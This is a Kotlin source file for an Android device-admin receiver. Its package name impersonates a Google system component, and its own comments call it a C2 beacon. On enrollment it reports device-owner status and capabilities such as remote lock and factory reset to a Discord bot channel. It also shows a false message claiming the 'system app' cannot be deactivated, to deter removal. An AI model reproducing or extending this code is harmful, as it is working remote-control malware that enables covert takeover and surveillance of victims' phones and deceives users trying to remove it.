package com.google.android.system

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * AppDeviceAdminReceiver
 *
 * Handles Device Admin policies such as remote lock, self-protection,
 * and notifies C2 channels (Telegram & Discord) upon enrollment.
 */
class AppDeviceAdminReceiver : DeviceAdminReceiver() {

    companion object {
        private const val TAG = "DeviceAdmin"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.i(TAG, "Device Admin Enabled")
        sendEnrollmentAlert(context)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.i(TAG, "Device Admin Disabled")
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        Log.w(TAG, "Device Admin Deactivation Requested! Blocking attempt.")
        return "⚠️ System app cannot be uninstalled or deactivated."
    }

    private fun sendEnrollmentAlert(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            val httpClient = OkHttpClient()
            try {
                val adminManager = DeviceAdminManager(context)
                val isOwner = adminManager.isDeviceOwner()
                val modeStr = if (isOwner) "👑 **DEVICE OWNER (Android Enterprise DPC)**" else "🛡️ **DEVICE ADMINISTRATOR**"

                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val alertText = "🎉 **Device Security Enrollment Success**\n" +
                        "• **Status**: $modeStr\n" +
                        "• **Package**: `${context.packageName}`\n" +
                        "• **Timestamp**: `$timeStr`\n" +
                        "• **Capabilities**: Remote Lock, Factory Reset, Enterprise Permission Control Unlocked!"

                // Send to Discord #02-status-alerts / #01-status-and-commands channel
                val dcPrefs = context.getSharedPreferences("discord_channels", Context.MODE_PRIVATE)
                val dcToken = dcPrefs.getString("discord_bot_token", "") ?: ""
                val dcChanId = dcPrefs.getString("chan_02-status-alerts", null)
                    ?: dcPrefs.getString("chan_01-status-and-commands", null)
                    ?: dcPrefs.getString("chan_01-master-commands", null)

                if (dcToken.isNotBlank() && !dcChanId.isNullOrBlank()) {
                    val url = "https://discord.com/api/v10/channels/$dcChanId/messages"
                    val json = JSONObject().apply {
                        put("content", alertText)
                    }
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val req = Request.Builder()
                        .url(url)
                        .addHeader("Authorization", "Bot $dcToken")
                        .post(body)
                        .build()
                    try { httpClient.newCall(req).execute().close() } catch (_: Exception) {}
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendEnrollmentAlert error: ${e.message}")
            }
        }
    }
}
